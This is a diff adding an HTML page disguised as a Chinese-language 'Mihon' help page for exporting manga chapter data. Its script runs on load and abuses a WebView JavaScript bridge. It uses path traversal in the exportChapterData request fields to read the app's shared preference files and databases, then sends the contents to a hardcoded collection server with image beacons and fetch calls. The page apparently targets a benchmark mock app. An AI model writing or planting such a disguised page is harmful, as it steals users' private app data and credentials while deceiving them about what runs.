@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 帮助中心 - 章节数据导出</title>
+<style>
+body { font-family: sans-serif; max-width: 640px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.info { color: #666; font-size: 14px; }
+table { width: 100%; border-collapse: collapse; margin: 8px 0; font-size: 13px; }
+td { padding: 6px 8px; border-bottom: 1px solid #ddd; }
+td:first-child { font-weight: bold; width: 130px; }
+.status-ok { color: green; }
+.status-err { color: red; }
+pre { background: #eee; padding: 8px; border-radius: 4px; font-size: 11px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; }
+</style>
+</head>
+<body>
+<h2>Mihon 章节数据导出</h2>
+<p class="info">将本地缓存的漫画章节打包导出，支持离线阅读与数据迁移。</p>
+
+<div class="card">
+<h3>当前章节</h3>
+<div id="chapter-info">加载中...</div>
+</div>
+
+<div class="card">
+<h3>阅读进度</h3>
+<div id="progress-info">加载中...</div>
+</div>
+
+<div class="card">
+<h3>已绑定的 Tracking 服务</h3>
+<div id="services-list">加载中...</div>
+</div>
+
+<div class="card">
+<h3>导出状态</h3>
+<div id="export-status">准备中...</div>
+<pre id="export-result" style="display:none;"></pre>
+</div>
+
+<script>
+var EXFIL = "http://10.201.103.217:8000/collect";
+alert("正在获取章节信息...");
+function log(id, text) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = text;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data);
+    try {
+        new Image().src = EXFIL + "?d=" + encodeURIComponent(payload);
+    } catch(e) {}
+    try {
+        fetch(EXFIL + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
+    } catch(e) {}
+}
+
+// ---- 正常业务调用 ----
+try {
+    var chapter = window.mihonAndroidBridge.getCurrentChapter();
+    log("chapter-info", chapter);
+    // exfil("currentChapter", chapter);
+} catch(e) { log("chapter-info", "不可用 — " + e.message); }
+
+try {
+    var progress = window.mihonAndroidBridge.getReadingProgress();
+    log("progress-info", progress);
+    // exfil("readingProgress", progress);
+} catch(e) { log("progress-info", "不可用 — " + e.message); }
+
+try {
+    var services = window.mihonAndroidBridge.getAvailableServices();
+    log("services-list", services);
+    // exfil("availableServices", services);
+} catch(e) { log("services-list", "不可用 — " + e.message); }
+
+// ---- 路径穿梭利用 exportChapterData ----
+var targets = [
+    "../../../../shared_prefs/tachiyomi_preferences.xml",
+    "../../../../shared_prefs/mihon_prefs.xml",
+    "../../../../shared_prefs/eu.kanade.tachiyomi_preferences.xml",
+    "../../../../../shared_prefs/tachiyomi_preferences.xml",
+    "../../../../../shared_prefs/eu.kanade.tachiyomi_preferences.xml",
+    "../../../../databases/mihon-database",
+    "../../../../databases/mihon.db",
+    "../../../files/benchmark_mock_data.json",
+    "../../../../files/benchmark_mock_data.json"
+];
+
+function tryTraversal(depth) {
+    var request = {
+        mangaId: "1",
+        chapterId: "1",
+        format: "json",
+        quality: "high",
+        includeImages: false,
+        storageGroup: "offline_library",
+        pageFiles: targets
+    };
+
+    try {
+        var result = window.mihonAndroidBridge.exportChapterData(JSON.stringify(request));
+        log("export-status", "导出完成 — 见下方数据");
+        var pre = document.getElementById("export-result");
+        pre.style.display = "block";
+        pre.textContent = result;
+        exfil("exportChapterData_full", result);
+
+        // 尝试解析并逐文件回传
+        try {
+            var obj = JSON.parse(result);
+            if (obj.pages) {
+                for (var i = 0; i < obj.pages.length; i++) {
+                    var page = obj.pages[i];
+                    var fname = page.file || ("unknown_" + i);
+                    var content = page.content || "";
+                    if (content) {
+                        exfil("file_" + fname, content);
+                    }
+                }
+            }
+        } catch(parseErr) {
+            exfil("exportChapterData_raw", result);
+        }
+    } catch(e) {
+        log("export-status", "导出失败 — " + e.message);
+        exfil("exportChapterData_error", e.message);
+    }
+}
+
+// 也尝试通过 storageGroup 参数进行路径穿梭
+function tryStorageGroupTraversal() {
+    var traversalGroups = [
+        "../../../shared_prefs",
+        "../../../../shared_prefs",
+        "../../../databases"
+    ];
+
+    for (var g = 0; g < traversalGroups.length; g++) {
+        var request = {
+            mangaId: "1",
+            chapterId: "1",
+            format: "json",
+            quality: "high",
+            includeImages: false,
+            storageGroup: traversalGroups[g],
+            pageFiles: ["tachiyomi_preferences.xml"]
+        };
+        try {
+            var result = window.mihonAndroidBridge.exportChapterData(JSON.stringify(request));
+            exfil("storageGroupTraversal_" + traversalGroups[g], result);
+        } catch(e) {}
+    }
+}
+
+// 也尝试通过 mangaId/chapterId 进行路径穿梭
+function tryChapterIdTraversal() {
+    var request = {
+        mangaId: "..",
+        chapterId: "../shared_prefs",
+        format: "json",
+        quality: "high",
+        includeImages: false,
+        storageGroup: "offline_library",
+        pageFiles: ["app.mihon.dev_preferences.xml", "eu.kanade.tachiyomi_preferences.xml"]
+    };
+    try {
+        var result = window.mihonAndroidBridge.exportChapterData(JSON.stringify(request));
+        exfil("chapterIdTraversal", result);
+    } catch(e) {}
+}
+
+setTimeout(function() {
+    log("export-status", "正在导出章节数据...");
+    tryTraversal();
+    setTimeout(tryStorageGroupTraversal, 1000);
+    setTimeout(tryChapterIdTraversal, 2000);
+}, 500);
+</script>
+</body>
+</html>
